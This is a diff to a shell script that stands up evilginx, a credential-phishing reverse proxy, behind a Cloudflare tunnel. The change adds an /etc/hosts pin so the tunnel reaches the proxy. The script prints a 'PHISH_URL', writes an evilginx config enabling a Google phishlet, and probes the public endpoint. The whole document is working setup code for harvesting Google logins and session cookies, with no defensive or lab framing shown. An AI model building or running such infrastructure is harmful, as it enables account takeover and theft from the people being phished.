@@ -8,7 +8,7 @@ if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi
 
 pkill -f evilginx 2>/dev/null || true
 
-echo "--- starting tunnel first ---"
+echo "--- phase 1: get tunnel url ---"
 nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify > cloudflared.log 2>&1 &
 URL=""
 for i in $(seq 1 60); do
@@ -19,10 +19,11 @@ done
 [ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
 HOST="${URL#https://}"
 
-echo "--- restarting tunnel with origin SNI=$HOST ---"
+echo "--- phase 2: pin $HOST -> 127.0.0.1 and restart tunnel with correct SNI ---"
+$SUDO sh -c "echo '127.0.0.1 $HOST' >> /etc/hosts"
 pkill -f cloudflared 2>/dev/null || true
 sleep 2
-nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify --origin-server-name "$HOST" > cloudflared.log 2>&1 &
+nohup "$CLOUDFLARED" tunnel --url "https://$HOST:443" --no-tls-verify > cloudflared.log 2>&1 &
 sleep 3
 
 echo "--- writing evilginx config (enable google) ---"
@@ -42,7 +43,8 @@ for i in $(seq 1 30); do
 done
 echo "PORT443_BOUND=$BOUND"
 echo "--- tunnel/edge probe (from runner) ---"
-curl -sS -m 12 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
+sleep 5
+curl -sS -m 15 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
 head -c 200 /tmp/edge.out 2>/dev/null || true
 echo ""
 
